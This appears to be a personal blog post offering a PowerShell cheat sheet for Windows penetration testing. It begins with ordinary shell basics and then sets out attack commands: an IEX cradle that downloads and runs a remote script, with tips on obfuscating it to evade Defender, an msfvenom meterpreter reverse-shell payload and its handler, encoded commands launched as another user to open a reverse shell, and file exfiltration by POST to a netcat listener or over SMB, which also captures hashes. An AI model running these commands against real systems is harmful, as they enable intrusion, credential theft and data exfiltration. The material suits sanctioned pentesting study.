---
layout: post
title: Windows Powershell Pivoting and General Pentesting Tricks
date: 2024-06-20 22:14 -0400
categories: [Hacking]
tags: [cheat sheet, powershell, windows, pentest]
---

Powershell is really like a third or fourth language to me. I've been using Windows long enough to get my way around it, but never having been a Windows administrator by trade I never really used it for what I've seen most people who are fluent in it really use it for, such as Azure administration and general domain controls. For my purposes, if I'm ever at a powershell prompt, the main reason I'm using it is to work my way around the file system to increase privileges. For that reason, there are a ton of tricks to get around it using _the Microsoft way_, which is still something I will typically forget. I remember reading a tweet way back when that really kinda sums up how I handle powershell: "Two weeks without coding and I've forgotten 30 years of experience." This statement is so true, and powershell is no different.

That said, this isn't really meant to _teach_ anyone anything new. You can just go to [Hacktricks](https://book.hacktricks.xyz) and get what you need. But rather, this will be a place I'll put some of my most personally searched-for tricks that I've come to rely on if I'm ever pentesting a Windows server. I intend to update this document as I find more techniques to add to my repertoire. So without further ado, here's a cheat sheet of sorts for moving around a windows box from the perspective of a pentester. I'll do my best to explain each command as well and why it's necessary.

## General Things-To-Know on Powershell

These are just some things to understand and remember when in a powershell environment, especially if you're just so used to a Linux environment like I am.

### Redirection

Probably the fundamental difference between powershell and bash (or similar) is the redirection method. A command like:

```terminal
$ cat /etc/passwd | awk -F: '{print $1}'
```

...will send the _string_ value of `/etc/passwd` and send it to the awk binary. Whereas in Powershell, a similar redirection using a pipe (`|`) will send an _object_ to the next commandlet, and each object will have attributes that you can refer to and manipulate. These objects are nebulous items that contain both properties and methods that are transferred through the pipeline.

For example, to display a particular file's _creation time_ we'd need to first use the `Get-Item` commandlet to essentially turn the file into an object, and pipe that to the `Select-Object` commandlet where we specify we care about `CreationTime`:

```terminal
PS > Get-Item .\file.txt | Select-Object CreationTime
```

### Environment Variables

You can print out the current environment variables by accessing the Environment Provider. In Powershell, you can list all providers with `Get-PSDrive`, and there you can see a Provider named `Env`. You can essentially treat each Provider here as if it's a drive letter of sorts. In this case, you can print out environment variables with:

```terminal
PS > Get-Item Env:
```

### The ? { ... } Shorthand and the $_ iterator

This confused me so much until I finally just looked it up. Sometimes you will see this in a script, and know that this is shorthand for the `Where-Object` commandlet. You would encase the function you want to run on each item in a list, putting the value in the `$_` shorthand, which itself is a built-in variable for the iterator that something will loop through.

For example:

```powershell
Get-Service | Where-Object {$_.Status -eq 'Stopped'}
```

is equivalent to:

```powershell
Get-Service | ?{$_.Status -eq 'Stopped'}
```

### Ranges

You can generate a range of numbers using the `..` notation, such that `1..10` will generate the numbers 1 through 10 as an iterator. 

### The % { ... } Shorthand

The `% { ... }` shorthand is short for the `ForEach-Object` commandlet, which will take an iterator piped to it and run instructions on each iterator. For example:

```powershell
1..1024 | % { Write-Output $_ }
```

### Assigning to Variables is Fundamental

In powershell, most of the time you will want to take the result of a string of commandlets and set it to a variable. This variable will be an object in powershell with attributes and methods as normal. But it can also be a set containing multiple objects.

```powershell
$computers = Get-DomainComputer -Properties dnshostname | Select-Object -ExpandProperty dnshostname
```

### Looping

You can loop over each object with a little bit of scripting. Useful for doing something for each item in a directory or similar. Take from the above `$computers` variable, which should pull the DNS hostnames

```powershell
$sid = Convert-NameToSid harry.jones
$computers = Get-DomainComputer -Properties dnshostname | Select-Object -ExpandProperty dnshostname
Foreach-Object ($c in $computers) { Get-NetLocalGroupMember -ComputerName $c | ? {_.SID -eq $sid }}
```

### Get a List of Aliases

You can review all the aliases with `Get-Alias`. Things like `dir` and `ls` are aliased to `Get-ChildItem`, `cp` is aliased to `Copy-Item`, etc. A lot of these commands are aliased to help Linux users feel more at ease I guess.

### Windows/Powershell is UTF-16 Little Endian

This is mostly meaningless to anyone running on a single Windows box, or even communicating between several windows boxes, but when you are moving scripts from a Linux machine (like, say, a Kali or Parrot VM), they are usually created as UTF-8le on a *nix system. This does not play nice with Powershell. If you are writing a script on a Linux machine, you should use the `iconv` binary to convert the script to UTF-16le before sending it to Windows. Otherwise your script will most likely fail.

```terminal
$ echo Invoke-WebRequest 10.10.20.30:8000/nc.exe -OutFile nc.exe | iconv -t utf-16le | base64 -w0
SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAMQAwAC4AMQAwAC4AMgAwAC4AMwAwADoAOAAwAD ...snip
```

### Encode a File as Base64

Powershell's method of encoding something in base64 is a little less intuitive than Linux, but the principle is similar I guess. It requires a few extra steps.

```powershell
# First of all, let's take a file object and store it in a variable.
$thisFile = Get-Content -Path .\path\to\some\file.exe

# Now we can convert the file into a Byte String
$deezBytes = [System.Text.Encoding]::Unicode.GetBytes($thisFile)

# Finally, store it in Base64.
$b64 = [Convert]::ToBase64String($deezBytes)
```
> Note: The above code will be garbled nonsense on a Linux box, so you must convert it using `iconv -t utf-8le`. Or you could just replace the `Unicode.GetBytes()` with `UTF8.GetBytes()` instead.
{: .prompt-warning}

Now we have the base64 encoded file stored in the `$b64` variable. Of course, you can always just one-line this, but considering how much goes into one line I figured it would be better to explain the process in three steps. Regardless, this is a one-liner version of the above:

```powershell
$b64 = [Convert]::ToBase64String((Get-Content -Path .\path\to\some\file.exe -Encoding Byte))
```

### Decode a File from Base64

Contrarily, if you have base64-encoded data that you want to decode, you can use the following:

```powershell
$Decoded = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($b64))
```

Again, replace `Unicode` with `UTF8` if we're dealing with that format.

## Executing As Another User

At this point I'm going to discuss the more pentesting approach to using Powershell. In Linux, to execute as another user you'd use either `su`, `sudo`, or if you're spending most of your time at the coffee shop waxing your moustache and vibing to NPR, `doas` or `run0`. Windows doesn't quite have the same thing. First you'll need to create a `Credential` object, which will contain the secure string of the password of the user (or whatever credential you have), and pass that to another script to invoke it.

### Creating a Credential Object

Windows is not too keen on you typing in a password into a variable like Linux would. It will throw all sorts of warnings at you unless you tell it to shut up. For this example, I will create a credential object with the credentials of `batman:letmein`.

```powershell
# The below will create a SecureString object, read it in as a parameter,
# and will tell windows to shut up with the warnings already:
$password = ConvertTo-SecureString "letmein" -AsPlainText -Force

# The below will apply a username to this password, pulling from a .NET
# object that can be used to run commands as these credentials.
$cred = New-Object System.Management.Automation.PSCredential("batman", $password)
```

Now you have the `$cred` variable which can be applied to commands that require authentication.

### Enter a Powershell Session

Note that this will _only_ work if WinRM is enabled. You can confirm this if port `5986` is open. 

```terminal
PS > New-PSSession -Credential $cred | Enter-PSSession
```

### Invoke a Command as Another User

This is an alternative, especially if either WinRM isn't listening, or if the user you have credentials for does not have the privileges of remote management.

```terminal
PS > Invoke-Command -Computer <this_computer_name> -ScriptBlock { whoami } -Credential $cred
```

### Start a Process as Another User

This is one I just discovered recently through Ippsec, so this lets you run an arbitrary command as a one-liner. You can copy the result of a Base64'd powershell script (as long as it was encoded into UTF-16le) through this command.

```terminal
PS > Start-Process -FilePath Powershell -ArgumentList "-enc <pasted_b64_string_here>" -Credential $cred
```

The benefit here is you can copy a Powershell script from something like [Nishang](https://github.com/samratashok/nishang) to toss back a reverse shell if need be. However note that there is a character limit, so it's best to use one of his famous Powershell Reverse TCP one-liners to ensure this works.

### Download and Run a Powershell Script

This isn't as useful so much these days because Defender is usually quick to toss the ban-hammer at anything involving the `Invoke-Expression` commandlet, but sometimes you can get lucky. This will assume you have a web server handy to serve something like a Nishang script as mentioned earlier, and there is no character limit here so you don't have to pare it down. Though it may be beneficial to obfuscate it a bit. For that, the [Powershell Obfuscation Bible](https://github.com/t3l3machus/PowerShell-Obfuscation-Bible) is a pretty handy resource.

```terminal
PS > IEX(New-Object Net.WebClient).downloadString('http://10.10.20.30:8000/myscript.ps1')
```

While technically this doesn't fall under the criteria as "running a script as another user," I think it can be argued that if you can find an exploit for an application _that runs as another user_, if you are to get it to execute the above, then you are effectivly executing a script as another user. Just food for thought.

## Useful Techniques

### Metasploit

If you'd like to upgrade your shell to a meterpreter shell, one thing you can do is create a staged payload binary, download it, and run it once you have meterpreter listening. To do that, first we'll generate the binary using `msfvenom`:

```terminal
$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.20.30 LPORT=9090 -f exe -o evil.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: evil.exe
```

You don't really need to specify the platform or architecture since you basically specify that in the payload list, under `windows/x64/meterpreter/reverse_tcp`. Don't forget to point to your LHOST and LPORT too.

Now you can upload that however you'd like. Set up a webserver in python using `python -m http.server`, send it via SMB, however you'd like. Now start up metasploit using `sudo msfdb run`.

Once it loads, set up your listener with the following commands:

```terminal
msf6 > use exploit/multi/handler
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 > set LHOST 10.10.20.30
msf6 > set LPORT 9090
msf6 > exploit
```

And now all you need to do is just execute `evil.exe` on the remote server. If it works you'll see a callback. If it doesn't, then Defender most likely shot it down.

### Getting Data To and From the Target

If you have a shell on the remote target and you would like to move a file or files from the target to your local machine, there are a few techniques you can do.

#### SMB

SMB is probably the most "Microsoft" way of moving data between two endpoints, and if you are determined enough, you can use it to copy files to and from the target machine. Locally, you'll want to make sure you have the [Impacket libraries](https://github.com/fortra/impacket), as it comes with a script named `smbserver.py`. From there, on your local machine, you would create a directory to serve and execute the script like so:

```terminal
$ mkdir ./smb/
$ smbserver.py -smb2support folder ./smb/
```

Now on the remote server, you can copy the file to yourself like it's any other file system.

```terminal
PS > copy ./someFile.txt //10.10.10.10/folder/
```

You will also get the added benefit of seeing the authentication hash of the user logged in to the windows server in the impacket screen. If you don't know the password, this might be worthwhile to attempt to either crack it or perform a Pass-The-Hash attempt. But I digress...

Now in some cases less rare than I'd like, sometimes this will fail due to incompatibility reasons. In that case, sometimes it's better to just let Samba do it since it's a bit more refined than Impacket.

To use Samba, first make sure it's installed:

```terminal
$ sudo apt-get install samba
```

Now create a directory just for a samba dumping ground:

```terminal
$ sudo mkdir -p /srv/smb/
```

Now go ahead and add the following line to the end of `/etc/samba/smb.conf`:

```text
[iwr]
  comment = Invoke-WebReq'd em? Damn near killed em!
  path = /srv/smb
  guest ok = yes
  browseable = yes
  create mask = 0600
  directory mask = 0755
```

Now start up Samba with `sudo systemctl start smbd`

> Note: This is an extremely wide-open share that anyone can write to! It's best to leave this service disabled and stop it when you're done using it.
{: .prompt-warning}

Now you can just copy to your server by a simple copy as before:

```terminal
PS > copy someFile.txt //10.10.10.10/iwr
```

If this doesn't work, there's more than one way to skin this cat. **DON'T FORGET TO STOP THE SAMBA SERVICE!**

#### Invoke-WebRequest ...and POST it!

This neat little trick I learned from Ippsec. When all else fails, you can always just base64 the data you want to copy over and send it as a POST request to your local machine. First, set up a netcat shell to output to a file:

```terminal
$ nc -lvnp 9090 > someFile.b64
```

Now on the remote windows box, base64 the data as mentioned above, and then use Invoke-WebRequest to send it via a POST:

```terminal
PS > $b64 = [Convert]::ToBase64String((Get-Content -Path .\path\to\someFile.exe -Encoding Byte))
PS > Invoke-WebRequest -URI http://10.10.10.10:9090 -Method POST -Body $b64
```

This will connect to your awaiting netcat shell, and it will output to the file `someFile.b64`, which will contain the base64'd data. If you open that file with an editor, _you will have to remove the HTTP headers from the top_, but once you do you should have your base64-encoded data. Now you can `iconv` it to UTF8 and decode it with the `base64` binary. There's your data!

#### Invoke-WebRequest is Always There For You

Of course if you're looking to move data from your local machine onto the target, you can always just stand up a webserver locally to host the file you'd want to retrieve and use `IWR` to pull it.

On the local machine:

```terminal
$ python -m http.server
```

Then on the remote machine:

```terminal
PS > Invoke-WebRequest -URI http://10.10.10.10:8000/myPayload.exe -OutFile .\myPayload.exe
```

And you're off to the races.
